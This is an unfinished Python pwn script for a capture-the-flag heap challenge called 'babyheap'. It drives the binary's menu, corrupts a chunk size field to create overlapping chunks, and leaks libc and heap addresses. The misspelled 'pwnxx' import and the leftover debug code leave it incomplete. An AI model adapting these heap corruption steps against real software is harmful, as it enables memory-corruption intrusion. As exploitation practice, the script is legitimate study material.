#!/usr/bin/env python
from pwnxx import *

# elf = ELF('./freenote_x64')
p = process('./babyheap')

pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))
# p = remote('127.0.0.1',10001)

def Allocate(x):
    p.recvuntil("Command: ")
    p.sendline(str(1))
    p.recvuntil("Size: ")
    p.sendline(str(x))

def Update(index,len,content):
    p.recvuntil("Command: ")
    p.sendline(str(2))
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    p.sendline(str(len))
    p.recvuntil("Content: ")
    p.sendline(content)


def Delete(x):
    p.recvuntil("Command:")
    p.sendline(str(3))
    p.recvuntil("Index: ")
    p.send(str(x) + "\n")

def View(x):
    p.recvuntil("Command:")
    p.sendline(str(4))
    p.recvuntil("Index: ")
    p.send(str(x) + "\n")

def Exit():
    p.recvuntil("Command:")
    p.sendline(str(5))


####################leak libc#########################
def pwn():

    maxindex=15
    maxlen=0x58
    print "calloc 0 1 2 3 4"
    Allocate(0x10 + 8)
    Allocate(0x10 + 8)
    Allocate(0x30 + 8)
    Allocate(0x50 + 8)
    Allocate(0x10 + 8)



####################leak heap#########################
    content = "a"*24 + "\xc1"
    size = 25
    Update(0, size,content)
    # gdb.attach(p)
    # raw_input()
    # p.interactive()



    print "free p1"
    Delete(1)



    print "malloc 1 (5) to get unsortedbin_add"
    Allocate(0x10 + 8)

    print "view idx 2"
    View(2)
    # p.recvuntil("Chunk[2]: ")
    a=p.recv(64)[10:26]
    print hex(pick64(a))
    # print hex(u64(a))




####################leak heap#########################
    print "one more again"
    gdb.attach(p)

    Allocate(0x38)
    Delete(0)
    Delete(6)


    View(2)
    a = p.recv(64)[10:26]
    print hex(pick64(a))

    View(1)
    a=p.recv(100)
    print a
    # a = p.recv(64)[10:26]
    # print hex(pick64(a))



    Allocate(0x10 + 8)


    View(2)
    a=p.recv(200)
    print a
    b=a[90:106]
    print hex(pick64(b))









    #
    # Allocate(0x10 + 8)
    # gdb.attach(p)
    # View(1)
    # a=p.recv(100)
    # print a
    # b = a[10:26]
    # print hex(pick64(a))

    # gdb.attach(p)


    # Allocate(0x10+8)
    # Allocate(0x10+8)
    # Allocate(0x10+8)
    # Allocate(0x10+8)
    # gdb.attach(p)
    raw_input()
    Update(0,0x10,"AAAA")
    Update(0,0x10,"BBBB")
    Update(0,0x10,"CCCC")
    Update(0,0x10,"DDDD")

    # delete_note(2)
    # delete_note(0)
    #
    # new_note("AAAA")
    # list_note()
    # leak = p.recvuntil("0. AAAA")
    # leak = p.recvuntil("\n")
    #
    # leak = leak[0:4]





if __name__ == '__main__':
    pwn()
